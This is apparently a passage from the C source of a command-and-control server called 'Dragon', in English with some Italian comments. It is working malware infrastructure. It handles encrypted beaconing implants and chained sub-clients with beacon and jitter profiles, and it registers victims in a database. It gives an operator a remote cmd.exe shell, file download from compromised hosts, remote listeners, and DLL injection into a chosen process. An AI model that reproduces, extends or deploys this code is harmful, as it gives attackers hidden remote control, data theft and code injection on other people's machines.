/* Return 0 = ok, -1 = timeout */
int shell_q_pop(ShellQueue *q, PACKET_DRAGON *pkt, int timeout_ms) {
    pthread_mutex_lock(&q->mu);
    if (q->count == 0) {
        struct timespec ts;
        clock_gettime(CLOCK_REALTIME, &ts);
        ts.tv_sec  += timeout_ms / 1000;
        ts.tv_nsec += (timeout_ms % 1000) * 1000000L;
        if (ts.tv_nsec >= 1000000000L) {
            ts.tv_sec++;
            ts.tv_nsec -= 1000000000L;
        }
        while (q->count == 0) {
            if (pthread_cond_timedwait(&q->not_empty, &q->mu, &ts)
                == ETIMEDOUT) {
                pthread_mutex_unlock(&q->mu);
                return -1;
            }
        }
    }
    memcpy(pkt, &q->pkts[q->head], sizeof(*pkt));
    q->head = (q->head + 1) % SHELL_QUEUE_SIZE;
    q->count--;
    pthread_mutex_unlock(&q->mu);
    return 0;
}

static void free_remote_listeners(RemoteListener *head)
{
    while (head) {
        RemoteListener *next = head->next;
        free(head);
        head = next;
    }
}

/* =========================================================================
 * handle_connection
 *
 * Main thread for each connected client. Does:
 * 1. X25519 handshake -> derives session keys
 * 2. Receives 0x00 init -> generates client ID
 * 3. Main loop handles all opcodes:
 *    - 0x00: new sub-client registration
 *    - 0x10: sub-client key exchange
 *    - 0x13: sub-client handshake done -> sends 0x12 with ID
 *    - 0x02: command output (prints to console)
 *    - 0x05: shell data (pushed to shell queue)
 *    - 0x0E/0x0F: listener/route responses
 *    - 0x15/0x16: file download chunks -> writes to local file
 *    - 0x1A: file upload ACK
 * Sub-client packets have double encryption - inner layer decrypted
 * by decrypt_inner_payload_if_needed.
 * ====================================================================== */
void *handle_connection(void *args) {
    ConnectionData *connData = (ConnectionData *)args;
    CLIENT *client = connData->client;
    struct ListeningSocket *ls = connData->listener;

    uint8_t ke[KEY_LEN], bi[NONCE_LEN], ck[KEY_LEN];
    if (dragon_handshake_server(client->conn, client->trans,
                                     server_priv, ke, bi, ck) != 0) {
        printf("[CRYPTO] handshake failed\n");
        client->trans->close(client->conn);
        ls->occupied = 0;
        free(connData);
        return NULL;
    }
    if (strcmp(client->trans->name, "http") == 0 ||
        strcmp(client->trans->name, "https") == 0) {
        uint8_t srv_pub[32];
        crypto_scalarmult_base(srv_pub, server_priv);
        if (!send_all(client->conn, client->trans, srv_pub, 32)) {
            printf("[CRYPTO] failed to send hs response for HTTP\n");
            client->trans->close(client->conn);
            ls->occupied = 0;
            free(connData);
            return NULL;
        }
    }
    dragon_derive_keys(ke, bi, ck, 1, client->key_tx, client->iv_tx, client->ck_tx, client->key_rx, client->iv_rx, client->ck_rx);
    sodium_memzero(ke, KEY_LEN);
    sodium_memzero(bi, NONCE_LEN);
    sodium_memzero(ck, KEY_LEN);
    client->tx_ctr       = 0;
    client->tx_epoch     = 0;
    client->rx_epoch     = 0;
    client->last_rx_ctr  = UINT64_MAX;
    free(connData);

    /* -- Receive malleable profile (opcode 0x50) -- first encrypted frame -- */
    PACKET_DRAGON prof_pkt;
    if (receive_packet(client->conn, client->trans,
                       client->key_rx, client->iv_rx, client->ck_rx, &client->rx_epoch,
                       &client->last_rx_ctr, &prof_pkt) == 0
        && strncmp(prof_pkt.opCode, OPCODE_PROFILE, 6) == 0)
    {
        if (profile_deserialize((uint8_t *)prof_pkt.payload, prof_pkt.payload_size, &client->profile) == 0) {
            client->profile_received = 1;
            client->beacon_timeout = client->profile.beacon_interval_s * (2 + client->level * 2);
            if (client->beacon_timeout < 60) client->beacon_timeout = 60;
            printf("[PROFILE] Received profile from client (beacon=%us jitter=%u%%)\n",
                   client->profile.beacon_interval_s, client->profile.jitter_pct);
            profile_dump(&client->profile);
        } else {
            fprintf(stderr, "[PROFILE] Failed to deserialize profile\n");
        }
    } else {
        fprintf(stderr, "[PROFILE] Expected 0x50 profile\n");
    }
 
    PACKET_DRAGON packet;
    if (receive_packet(client->conn, client->trans,
                        client->key_rx, client->iv_rx, client->ck_rx, &client->rx_epoch,
                        &client->last_rx_ctr, &packet) == 0)
    {
        char mac_address[18] = {0};
        char father_id[ID_LEN] = {0};
        char father_listener_name[32] = {0};
        char *token = strtok(packet.payload, "|");
        if (token) strncpy(mac_address, token, sizeof(mac_address)-1);
        token = strtok(NULL, "|");
        if (token) strncpy(father_id, token, sizeof(father_id)-1);
        token = strtok(NULL, "|");
        if (token) strncpy(father_listener_name, token, sizeof(father_listener_name)-1);
 
        char client_id[ID_LEN];
        int  level = packet.target_level;
        generate_sha1_id(mac_address, client_id);
        printf("Generated Client ID: %s\n", client_id);
 
        client->id = strdup(client_id);
 
        memset(&packet, 0, sizeof(packet));
        strcpy(packet.opCode, "0x00");
        packet.payload_size = 0;
        packet.target_level = level;
        strncpy(packet.target_id, client_id, ID_LEN - 1);
 
        if (send_packet(client->conn, client->trans,
                             client->key_tx, client->iv_tx, &client->tx_ctr, client->ck_tx,
                             &client->tx_epoch, &packet) != 0) {
            perror("send id init");
        }
    } else {
        printf("Failed to receive init packet\n");
    }
 
    const bson_t *document = get_client_by_id(client->id);
    if (document) {
        get_client_from_document(document, client);
    } else {
        printf("Inserting to DB\n");
        insert_into_db(client);
        printf("\nDragon: ");
        fflush(stdout);
    }
 
    int in_resp_stream = 0;
    while (1) {
        PACKET_DRAGON pack;
        uint8_t _wire[WIRE_FRAME_SIZE];
        size_t received = 0;
        while (received < WIRE_FRAME_SIZE) {
            int n = client->trans->recv(client->conn, _wire + received, WIRE_FRAME_SIZE - received);
            if (n <= 0) {
                if (client->in_shell) goto next_iter;
                goto disconnected;
            }
            received += (size_t)n;
        }

        uint64_t wire_ctr;
        memcpy(&wire_ctr, _wire, CTR_HDR);
        if (client->last_rx_ctr != UINT64_MAX && wire_ctr <= client->last_rx_ctr) {
            fprintf(stderr, "[REPLAY] ctr %lu <= %lu\n",
                    (unsigned long)wire_ctr, (unsigned long)client->last_rx_ctr);
            if (client->in_shell) continue;
            break;
        }
        
        pthread_mutex_lock(&client->crypto_mu);
        uint8_t _plain[PLAINTEXT_SIZE];
        int dec_ok = dragon_decrypt_frame(client->key_rx, client->iv_rx, _wire, _plain, NULL);
        if (dec_ok != 0) {
            fprintf(stderr, "[handle_connection] decrypt failed\n");
            if (client->in_shell) continue;
            break;
        }
        client->last_rx_ctr = wire_ctr;
        uint64_t new_ep = wire_ctr / REKEY_INTERVAL;
        while (client->rx_epoch < new_ep) {
            dragon_rekey(client->key_rx, client->ck_rx);
            client->rx_epoch++;
        }
        pthread_mutex_unlock(&client->crypto_mu);
        
        client->last_beacon = time(NULL);
        if (deserialize_packet(&pack, (char*)_plain) != 0) {
            if (client->in_shell) continue;
            break;
        }
 
        if (client->in_shell) {
            shell_q_push(&client->shell_q, &pack);
            continue;
        }
 
        /* -- sub-client init (0x00) -- */
        if (pack.target_level > 1 && !strcmp(pack.opCode, "0x00")) {
            printf("New sub client arrived\n");
            CLIENT *new_client = malloc(sizeof(CLIENT));
            if (!new_client) { perror("malloc"); continue; }
            memset(new_client, 0, sizeof(CLIENT));
            pthread_mutex_init(&new_client->crypto_mu, NULL);
            pthread_mutex_init(&new_client->shell_pkt_mu, NULL);
            pthread_cond_init(&new_client->shell_pkt_cond, NULL);
            shell_q_init(&new_client->shell_q);
            new_client->shell_pkt_ready = 0;
 
            char mac_address_sub[18] = {0};
            char father_id[ID_LEN]   = {0};
            char father_listener_name[32] = {0};
            char *token = strtok(pack.payload, "|");
            if (token) strncpy(mac_address_sub, token, sizeof(mac_address_sub)-1);
            token = strtok(NULL, "|");
            if (token) strncpy(father_id, token, sizeof(father_id)-1);
            token = strtok(NULL, "|");
            if (token) strncpy(father_listener_name, token, sizeof(father_listener_name)-1);
 
            char client_id_sub[ID_LEN];
            generate_sha1_id(mac_address_sub, client_id_sub);
 
            new_client->conn  = client->conn;
            new_client->trans = client->trans;
            new_client->level = pack.target_level;
            strncpy(new_client->father, father_id, ID_LEN - 1);
            new_client->father[ID_LEN-1] = '\0';
            new_client->child[0] = '\0';
            new_client->status = "active";
            new_client->test   = "NEW";
            new_client->last_beacon = time(NULL);
            new_client->id = malloc(ID_LEN);
            if (!new_client->id) {
                perror("malloc id"); free(new_client); continue;
            }
            strncpy(new_client->id, client_id_sub, ID_LEN - 1);
            new_client->id[ID_LEN-1] = '\0';
            strncpy(new_client->listener_name, client->listener_name, sizeof(new_client->listener_name) - 1);
            new_client->listener_name[sizeof(new_client->listener_name) - 1] = '\0';
            add_client(new_client);
 
            notify_parents_of_new_client(client,
                                          client_id_sub,
                                          pack.target_level,
                                          father_listener_name, father_id);
        }
 
        /* -- handshake sub-client (0x10) -- */
        else if (!strcmp(pack.opCode, "0x10")) {
            printf("[HANDSHAKE] 0x10 from sub-client\n");
            if (pack.payload_size != 32) {
                printf("[ERROR] Invalid pubkey size\n"); continue;
            }
            uint8_t pub_subclient[32];
            memcpy(pub_subclient, pack.payload, 32);
 
            uint8_t shared[32];
            if (crypto_scalarmult(shared, server_priv, pub_subclient) != 0) {
                printf("[CRYPTO] scalarmult failed\n"); continue;
            }
            uint8_t km[64];
            crypto_kdf_derive_from_key(km, 64, 0x01, "DRAGONHS", shared);
            uint8_t ke_sub[KEY_LEN], bi_sub[NONCE_LEN], ck_sub[KEY_LEN];
            crypto_generichash(ke_sub, KEY_LEN,   km, 64, (uint8_t*)"enc", 3);
            crypto_generichash(bi_sub, NONCE_LEN, km, 64, (uint8_t*)"iv",  2);
            crypto_generichash(ck_sub, KEY_LEN,   km, 64, (uint8_t*)"ck",  2);
            sodium_memzero(shared, sizeof shared);
            sodium_memzero(km,     sizeof km);
 
            CLIENT *sub = return_client_by_id(pack.target_id);
            if (!sub) {
                printf("[ERROR] Sub-client %s not found\n", pack.target_id);
                continue;
            }
            dragon_derive_keys(ke_sub, bi_sub, ck_sub, 1, sub->key_tx, sub->iv_tx, sub->ck_tx, sub->key_rx, sub->iv_rx, sub->ck_rx);
            sodium_memzero(ke_sub, KEY_LEN);
            sodium_memzero(bi_sub, NONCE_LEN);
            sodium_memzero(ck_sub, KEY_LEN);
            sub->tx_ctr      = 0;
            sub->tx_epoch    = 0;
            sub->rx_epoch    = 0;
            sub->last_rx_ctr = UINT64_MAX;
            sub->status = "active";
            sub->last_beacon = time(NULL);
 
            /* Invia 0x11 - ACK */
            PACKET_DRAGON ack = {0};
            strcpy(ack.opCode, "0x11");
            ack.target_level = sub->level;
            strncpy(ack.target_id, sub->id, ID_LEN - 1);
            uint16_t ack_blob_len = 0;
            if (dragon_encryption_blob(sub->key_tx, sub->iv_tx,
                                        &sub->tx_ctr,
                                        (uint8_t*)ack.payload, 0,
                                        (uint8_t*)&ack.payload,
                                        &ack_blob_len) != 0) {
                printf("[ERROR] Encrypt 0x11 failed\n"); continue;
            }
            ack.payload_size = ack_blob_len;
            if (send_packet(client->conn, client->trans,
                             client->key_tx, client->iv_tx, &client->tx_ctr, client->ck_tx,
                             &client->tx_epoch, &ack) != 0) {
                printf("[ERROR] Send 0x11 failed\n"); continue;
            }
            printf("[HANDSHAKE] 0x11 inviato a %s\n", sub->id);
        }

        else if (!strcmp(pack.opCode, "0x13")) {
            printf("[HANDSHAKE] 0x13 from sub-client %s\n", pack.target_id);
 
            CLIENT *sub = return_client_by_id(pack.target_id);
            if (!sub) {
                printf("[ERROR] 0x13: sub-client %s not found\n",
                       pack.target_id);
                continue;
            }
 
            PACKET_DRAGON id_assign = {0};
            strcpy(id_assign.opCode, "0x12");
            id_assign.target_level = sub->level;
            strncpy(id_assign.target_id, sub->id, ID_LEN - 1);
            uint16_t id_blob_len = 0;
            if (dragon_encryption_blob(sub->key_tx, sub->iv_tx,
                                        &sub->tx_ctr,
                                        (uint8_t*)id_assign.payload, 0,
                                        (uint8_t*)&id_assign.payload,
                                        &id_blob_len) != 0) {
                printf("[ERROR] Encrypt 0x12 failed\n"); continue;
            }
            id_assign.payload_size = id_blob_len;
            if (send_packet(client->conn, client->trans,
                             client->key_tx, client->iv_tx, &client->tx_ctr, client->ck_tx,
                             &client->tx_epoch, &id_assign) != 0) {
                printf("[ERROR] Send 0x12 failed\n"); continue;
            }
            printf("[HANDSHAKE] Sub-client %s ready\n", sub->id);
        }
 
        /* -- tutti gli altri opcode -- */
        else {
            if (!strcmp(pack.opCode, "0x01")) {
                if (decrypt_inner_payload_if_needed(&pack) != 0) {
                    continue;
                }
                if (pack.target_level > 1) {
                    CLIENT *sub = return_client_by_id(pack.target_id);
                    if (sub) sub->last_beacon = time(NULL);
                }
            } else if (!strcmp(pack.opCode, "0x02")) {
                if (decrypt_inner_payload_if_needed(&pack) != 0)
                    continue;
                if (pack.payload_size == 0) {
                    /* empty 0x02 = end-of-response terminator */
                    if (!in_resp_stream) {
                        printf("\n[RESP %s:%d]\n",
                               inet_ntoa(client->address.sin_addr),
                               ntohs(client->address.sin_port));
                    }
                    putchar('\n');
                    fflush(stdout);
                    in_resp_stream = 0;
                } else {
                    if (!in_resp_stream) {
                        printf("\n[RESP %s:%d]\n",
                               inet_ntoa(client->address.sin_addr),
                               ntohs(client->address.sin_port));
                        in_resp_stream = 1;
                    }
                    write(STDOUT_FILENO, pack.payload, pack.payload_size);
                    fflush(stdout);
                }
            } else if (!strcmp(pack.opCode, "0x0E")) {
                if (decrypt_inner_payload_if_needed(&pack) != 0)
                    continue;
                PendingQuery *pq = find_pending_query(pack.target_id,
                                                       REQ_LISTENERS);
                if (pq) {
                    if (pack.payload_size == 0 ||
                        (pack.target_level > 1 &&
                         pack.payload_size == TAG_LEN))
                    {
                        pq->buffer[pq->used] = '\0';
                        printf("\n[Listeners of %s]\n%s\n",
                               pack.target_id, pq->buffer);
                        remove_pending_query(pq);
                        printf("\nDragon: ");
                        continue;
                    }
                    size_t need = pq->used + pack.payload_size;
                    if (need + 1 > pq->cap) {
                        size_t newcap = pq->cap * 2;
                        while (newcap < need + 1) newcap *= 2;
                        char *tmp = realloc(pq->buffer, newcap);
                        if (!tmp) { remove_pending_query(pq); continue; }
                        pq->buffer = tmp;
                        pq->cap    = newcap;
                    }
                    memcpy(pq->buffer + pq->used, pack.payload, pack.payload_size);
                    pq->used += pack.payload_size;
                }
                continue;
 
            } else if (!strcmp(pack.opCode, "0x0F")) {
                if (decrypt_inner_payload_if_needed(&pack) != 0)
                    continue;
                PendingQuery *pq = find_pending_query(pack.target_id,
                                                       REQ_ROUTES);
                if (pq) {
                    if (pack.payload_size == 0 ||
                        (pack.target_level > 1 &&
                         pack.payload_size == TAG_LEN))
                    {
                        pq->buffer[pq->used] = '\0';
                        printf("\n[Routes of %s]\n%s\n",
                               pack.target_id, pq->buffer);
                        remove_pending_query(pq);
                        printf("\nDragon: ");
                        continue;
                    }
                    size_t need = pq->used + pack.payload_size;
                    if (need + 1 > pq->cap) {
                        size_t newcap = pq->cap * 2;
                        while (newcap < need + 1) newcap *= 2;
                        char *tmp = realloc(pq->buffer, newcap);
                        if (!tmp) { remove_pending_query(pq); continue; }
                        pq->buffer = tmp;
                        pq->cap    = newcap;
                    }
                    memcpy(pq->buffer + pq->used, pack.payload, pack.payload_size);
                    pq->used += pack.payload_size;
                }
                continue;
            } else if (!strcmp(pack.opCode, "0x1E")) {
                /* Listener ACK from client */
                if (decrypt_inner_payload_if_needed(&pack) != 0)
                    continue;
                char ack_buf[128];
                size_t alen = pack.payload_size < sizeof(ack_buf) - 1
                            ? pack.payload_size : sizeof(ack_buf) - 1;
                memcpy(ack_buf, pack.payload, alen);
                ack_buf[alen] = '\0';

                char *a_name  = strtok(ack_buf, "|");
                char *a_port  = strtok(NULL, "|");
                char *a_trans = strtok(NULL, "|");
                char *a_stat  = strtok(NULL, "|");
                if (!a_name || !a_port || !a_trans || !a_stat) continue;

                /* identify target client */
                CLIENT *target = client;              /* default: level 1 */
                if (pack.target_level > 1) {
                    target = return_client_by_id(pack.target_id);
                    if (!target) continue;
                }

                if (strcmp(a_stat, "ok") == 0) {
                    RemoteListener *rl = calloc(1, sizeof(RemoteListener));
                    strncpy(rl->name, a_name, sizeof(rl->name) - 1);
                    rl->port = atoi(a_port);
                    strncpy(rl->transport, a_trans, sizeof(rl->transport) - 1);
                    rl->profile = g_profile;
                    rl->next = target->remote_listeners;
                    target->remote_listeners = rl;
                    int cid = -1;
                    for (int i = 0; i < MAX_CLIENTS; i++) {
                        if (clients[i] == target) { cid = i; break; }
                    }
                    registry_add_listener(a_name, atoi(a_port), a_trans, cid, &g_profile);
                    printf("\n[ACK] Listener '%s' started on %s (port %s, %s)\n",
                           a_name, pack.target_id, a_port, a_trans);
                    printf("Dragon: ");
                    fflush(stdout);
                } else {
                    printf("\n[ACK] Listener '%s' FAILED on %s (port %s, %s)\n",
                           a_name, pack.target_id, a_port, a_trans);
                    printf("Dragon: ");
                    fflush(stdout);
                }
                continue;
            } else if (!strcmp(pack.opCode, "0x1A")) {
                if (decrypt_inner_payload_if_needed(&pack) != 0) continue;
                uint8_t status = (pack.payload_size >= 1)
                                ? (uint8_t)pack.payload[0] : 0;
                if (status == 0)
                    printf("[UPLOAD] Client has received correctly\n");
                else
                    printf("[UPLOAD] Error client side(status=%d)\n", status);
                printf("\nDragon: "); fflush(stdout);
            } else if (!strcmp(pack.opCode, "0x15")) {
                if (decrypt_inner_payload_if_needed(&pack) != 0) continue;

                CLIENT *xfer_client;
                if (pack.target_level > 1) {
                    xfer_client = return_client_by_id(pack.target_id);
                    if (!xfer_client) continue;
                } else {
                    xfer_client = client;
                }

                if (!xfer_client->xfer_dl_active || !xfer_client->xfer_dl_fp) continue;
                if (pack.payload_size < 4) continue;

                size_t data_len = pack.payload_size - 4;
                if (data_len > 0) {
                    fwrite(pack.payload + 4, 1, data_len, xfer_client->xfer_dl_fp);
                    xfer_client->xfer_dl_bytes += data_len;
                }

            } else if (!strcmp(pack.opCode, "0x16")) {
                if (decrypt_inner_payload_if_needed(&pack) != 0) continue;

                CLIENT *xfer_client;
                if (pack.target_level > 1) {
                    xfer_client = return_client_by_id(pack.target_id);
                    if (!xfer_client) continue;
                } else {
                    xfer_client = client;
                }

                if (!xfer_client->xfer_dl_active || !xfer_client->xfer_dl_fp) continue;

                fflush(xfer_client->xfer_dl_fp);
                fclose(xfer_client->xfer_dl_fp);
                xfer_client->xfer_dl_fp = NULL;
                xfer_client->xfer_dl_active = 0;
                printf("[DOWNLOAD] File saved: %s (%llu byte)\n",
                    xfer_client->xfer_dl_local,
                    (unsigned long long)xfer_client->xfer_dl_bytes);
                xfer_client->xfer_dl_bytes = 0;
                printf("\nDragon: ");
                fflush(stdout);
            }
        }
        next_iter: ;
    }
    disconnected:
    while (client->in_shell) sleep(1);

    pthread_mutex_lock(&clients_collection_mutex);
    for (int i = 0; i < MAX_CLIENTS; ++i) {
        if (clients[i] && clients[i] != client
            && clients[i]->conn == client->conn) {
            registry_remove_all_for_client(i);
            clients[i]->status = "dead";
            clients[i]->conn = NULL;  // previeni uso della connessione chiusa
        }
    }
    pthread_mutex_unlock(&clients_collection_mutex);

    client->trans->close(client->conn);
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i] == client) {
            registry_remove_all_for_client(i);
            break;
        }
    }
    free_remote_listeners(client->remote_listeners);
    if (client->xfer_dl_fp)
        fclose(client->xfer_dl_fp);

    pthread_mutex_lock(&clients_collection_mutex);
    for (int i = 0; i < MAX_CLIENTS; ++i) {
        if (clients[i] == client) {
            clients[i] = NULL;
            break;
        }
    }
    pthread_mutex_unlock(&clients_collection_mutex);

    pthread_mutex_lock(&list_mutex);
    ListeningSocket *lsc = head_listeners;
    while (lsc) {
        if (lsc->client == client)
            lsc->client = NULL;
        lsc = lsc->next;
    }
    pthread_mutex_unlock(&list_mutex);

    free(client->id);
    free(client);
    ls->occupied = 0;
    return NULL;
}


/* =========================================================================
 * chunk_and_send
 *
 * Splits a buffer into packet-sized chunks and sends each one.
 * For level > 1, encrypts payload with sub-client keys first.
 * Used for shell data (0x05). Locks client->crypto_mu per send.
 * ====================================================================== */
static int chunk_and_send(CLIENT *client, const char *buf,
                           size_t len, int level, const char *id)
{
    PACKET_DRAGON pkt;
    memset(&pkt, 0, sizeof pkt);
    strcpy(pkt.opCode, "0x05");

    CLIENT *sub = NULL;
    if (level > 1) {
        sub = return_client_by_id(id);
        if (!sub) {
            printf("[ERROR] Sub-client %s not found\n", id);
            return -1;
        }
    }

    while (len) {
        size_t max_clear = (level > 1)
                     ? sizeof(pkt.payload) - TAG_LEN - CTR_HDR
                     : sizeof(pkt.payload);
        uint16_t chunk = (uint16_t)((len > max_clear) ? max_clear : len);
        memcpy(pkt.payload, buf, chunk);
        pkt.payload_size = chunk;
        pkt.target_level = level;
        strncpy(pkt.target_id, id, ID_LEN - 1);

        if (level > 1) {
            uint16_t blob_len = 0;
            uint8_t tmp_chunk[PLAINTEXT_SIZE];
            memcpy(tmp_chunk, pkt.payload, chunk);
            if (dragon_encryption_blob(sub->key_tx, sub->iv_tx,
                                        &sub->shell_ctr64_tx,
                                        tmp_chunk, chunk,
                                        (uint8_t*)pkt.payload,
                                        &blob_len) != 0) {
                printf("[ERROR] encrypt shell chunk\n");
                return -1;
            }
            pkt.payload_size = blob_len;
        }

        pthread_mutex_lock(&client->crypto_mu);
        int sr = send_packet(client->conn, client->trans,
                             client->key_tx, client->iv_tx, &client->tx_ctr, client->ck_tx,
                             &client->tx_epoch, &pkt);
        pthread_mutex_unlock(&client->crypto_mu);
        if (sr != 0) {
            perror("send_packet shell");
            return -1;
        }
        len -= chunk;
        buf += chunk;
    }
    return 0;
}

/* =========================================================================
 * interactive_shell [LEGACY]
 *
 * Opens interactive shell with a client. Sends 0x03 to start cmd.exe,
 * reads operator input, sends as 0x05, receives output from shell queue.
 * Uses raw terminal mode. SIGINT sends Ctrl+C to client instead of
 * killing server. Must be fixed in future.
 * ====================================================================== */
void interactive_shell(int port, int level, const char *target_id) {
    pthread_mutex_lock(&list_mutex);
    ListeningSocket *ls = head_listeners;
    while (ls && !(ls->port == port && ls->occupied && ls->client))
        ls = ls->next;
    pthread_mutex_unlock(&list_mutex);

    if (!ls) {
        printf("[-] No active client on port %d\n", port);
        return;
    }
    CLIENT *client = ls->client;
    client->in_shell = 1;

    /* Invia SHELL_START (0x03) */
    PACKET_DRAGON start = {0};
    strcpy(start.opCode, "0x03");
    start.payload_size = 0;
    start.target_level = level;
    strncpy(start.target_id, target_id, ID_LEN - 1);

    CLIENT *sub = NULL;
    if (level > 1) {
        sub = return_client_by_id(target_id);
        if (!sub) {
            printf("[ERROR] Sub-client %s not found\n", target_id);
            client->in_shell = 0;
            return;
        }
        sub->shell_ctr64_rx = 0;
        sub->shell_ctr64_tx = 0;
        uint16_t blob_len = 0;
        if (dragon_encryption_blob(sub->key_tx, sub->iv_tx,
                                    &sub->tx_ctr,
                                    (uint8_t*)start.payload, 0,
                                    (uint8_t*)start.payload,
                                    &blob_len) != 0) {
            printf("[ERROR] Encrypt 0x03 failed\n");
            client->in_shell = 0;
            return;
        }
        start.payload_size = blob_len;
    }
    pthread_mutex_lock(&client->crypto_mu);
    int sr_start = send_packet(ls->client->conn, ls->client->trans,
                             ls->client->key_tx, ls->client->iv_tx, &ls->client->tx_ctr, ls->client->ck_tx,
                             &ls->client->tx_epoch, &start);
    pthread_mutex_unlock(&client->crypto_mu);
    if (sr_start != 0) {
        perror("send SHELL_START");
        client->in_shell = 0;
        return;
    }

    void (*old_hdl)(int) = signal(SIGINT, shell_handle_sigint);
    shell_got_sigint = 0;

    char *line = NULL;
    PACKET_DRAGON pkt;

    while (1) {
        fflush(stdout);
        if (shell_got_sigint) { shell_got_sigint = 0; break; }

        line = readline("");
        if (line == NULL) break;

        size_t n = strlen(line);
        while (n > 0 && (line[n-1] == '\n' || line[n-1] == '\r'))
            line[--n] = '\0';

        if (n == 0) { free(line); line = NULL; continue; }

        if (strcmp(line, "exit") == 0) {
            const char exit_cmd[] = "exit\r\n";
            chunk_and_send(ls->client, exit_cmd,
                           sizeof(exit_cmd) - 1, level, target_id);
            free(line);
            break;
        }
        line[n]   = '\r';
        line[n+1] = '\n';
        line[n+2] = '\0';

        if (chunk_and_send(ls->client, line, strlen(line),
                           level, target_id) != 0) {
            perror("send shell data");
            free(line);
            break;
        }
        free(line);
        line = NULL;

        while (1) {
            PACKET_DRAGON pkt;
            if (shell_q_pop(&client->shell_q, &pkt, 200) != 0)
                break;  /* timeout 200ms, torna a readline */

            if (strcmp(pkt.opCode, "0x05") != 0) continue;

            decrypt_inner_payload_if_needed(&pkt);
            print_filtered_output(pkt.payload, pkt.payload_size,
                                pkt.target_level,
                                return_client_by_id(pkt.target_id));
            fflush(stdout);
        }
    }

cleanup:
    PACKET_DRAGON endpkt = {0};
    strcpy(endpkt.opCode, "0x06");
    endpkt.payload_size = 0;
    endpkt.target_level = level;
    strncpy(endpkt.target_id, target_id, ID_LEN - 1);
    if (level > 1) {
        CLIENT *s = return_client_by_id(target_id);
        if (s) {
            uint16_t blob_len = 0;
            if (dragon_encryption_blob(s->key_tx, s->iv_tx,
                                        &s->tx_ctr,
                                        (uint8_t*)endpkt.payload, 0,
                                        (uint8_t*)endpkt.payload,
                                        &blob_len) == 0)
                endpkt.payload_size = blob_len;
        }
    }
    pthread_mutex_lock(&client->crypto_mu);
    send_packet(ls->client->conn, ls->client->trans,
                             ls->client->key_tx, ls->client->iv_tx, &ls->client->tx_ctr, ls->client->ck_tx,
                             &ls->client->tx_epoch, &endpkt);
    pthread_mutex_unlock(&client->crypto_mu);

    client->in_shell = 0;
    puts("\n[+] Shell closed");
    signal(SIGINT, old_hdl);
}

/* =========================================================================
 * DLL injection
 * ====================================================================== */

/* =========================================================================
 * send_dll_to_client  [LEGACY]
 *
 * Sends a DLL to a client for injection. Uses opcodes 0x07/0x08/0x09.
 * Replaced by send_exec_memory. Kept for future use.
 * ====================================================================== */
void send_dll_to_client(int port, int pid, const char *dll_path,
                         int level) {
    pthread_mutex_lock(&list_mutex);
    ListeningSocket *ls = head_listeners;
    while (ls && !(ls->port == port && ls->occupied && ls->client))
        ls = ls->next;
    pthread_mutex_unlock(&list_mutex);

    if (!ls) { printf("[-] No active client on port %d\n", port); return; }
    CLIENT *nexthop   = ls->client;
    const char *target_id = nexthop->id;
    CLIENT *dst = NULL;
    if (level > 1) {
        dst = return_client_by_id(target_id);
        if (!dst) {
            printf("[ERROR] Target not found: %s\n", target_id); return;
        }
    }

    PACKET_DRAGON pkt = {0};
    snprintf(pkt.opCode,   sizeof pkt.opCode,   "0x07");
    snprintf(pkt.payload,  sizeof pkt.payload,  "%d:%s", pid, dll_path);
    pkt.payload_size = (uint16_t)strlen(pkt.payload);
    pkt.target_level = level;
    strncpy(pkt.target_id, ls->client->id, ID_LEN - 1);
    if (level > 1) {
        uint16_t blob_len;
        uint8_t tmp_pay[PLAINTEXT_SIZE];
        memcpy(tmp_pay, pkt.payload, pkt.payload_size);
        if (dragon_encryption_blob(dst->key_tx, dst->iv_tx,
                                    &dst->tx_ctr,
                                    tmp_pay,
                                    pkt.payload_size,
                                    (uint8_t*)pkt.payload,
                                    &blob_len) != 0) {
            printf("[ERROR] Encrypt 0x07 failed\n"); return;
        }
        pkt.payload_size = blob_len;
    }
    if (send_packet(nexthop->conn, nexthop->trans,
                             nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx,
                             &nexthop->tx_epoch, &pkt) != 0) {
        perror("send 0x07"); return;
    }

    FILE *f = fopen(dll_path, "rb");
    if (!f) { printf("[-] DLL not found: %s\n", dll_path); return; }
    fseek(f, 0, SEEK_END);
    size_t dll_size = ftell(f);
    rewind(f);
    char *dll_buf = malloc(dll_size);
    fread(dll_buf, 1, dll_size, f);
    fclose(f);

    memset(&pkt, 0, sizeof pkt);
    snprintf(pkt.opCode,  sizeof pkt.opCode,  "0x08");
    snprintf(pkt.payload, sizeof pkt.payload, "%zu", dll_size);
    pkt.payload_size = (uint16_t)strlen(pkt.payload);
    if (level > 1) {
        uint16_t blob_len;
        uint8_t tmp_buf[PLAINTEXT_SIZE];
        memcpy(tmp_buf, pkt.payload, pkt.payload_size);
        dragon_encryption_blob(dst->key_tx, dst->iv_tx, &dst->tx_ctr,
                                tmp_buf, pkt.payload_size,
                                (uint8_t*)pkt.payload, &blob_len);
        pkt.payload_size = blob_len;
    }
    send_packet(nexthop->conn, nexthop->trans,
                             nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx,
                             &nexthop->tx_epoch, &pkt);

    size_t sent = 0;
    while (sent < dll_size) {
        size_t chunk = dll_size - sent > sizeof(pkt.payload)
                     ? sizeof(pkt.payload) : dll_size - sent;
        memset(&pkt, 0, sizeof pkt);
        snprintf(pkt.opCode, sizeof pkt.opCode, "0x09");
        memcpy(pkt.payload, dll_buf + sent, chunk);
        pkt.payload_size = (uint16_t)chunk;
        if (level > 1) {
            uint16_t blob_len;
            uint8_t tmp_blob[PLAINTEXT_SIZE];
            memcpy(tmp_blob, pkt.payload, pkt.payload_size);
            dragon_encryption_blob(dst->key_tx, dst->iv_tx,
                                    &dst->tx_ctr,
                                    tmp_blob,
                                    pkt.payload_size,
                                    (uint8_t*)pkt.payload, &blob_len);
            pkt.payload_size = blob_len;
        }
        if (send_packet(nexthop->conn, nexthop->trans,
                             nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx,
                             &nexthop->tx_epoch, &pkt) != 0) {
            perror("send 0x09"); break;
        }
        sent += chunk;
    }
    free(dll_buf);
    printf("[DLL] Sent '%s' to client (PID %d)\n", dll_path, pid);
}

/* =========================================================================
 * listener_thread
 *
 * Runs one listening socket. Accepts connections and spawns
 * handle_connection for each client. Runs until active=0.
 * ====================================================================== */
void *listener_thread(void *arg) {
    ListeningSocket *ls = (ListeningSocket *)arg;
    while (ls->active) {
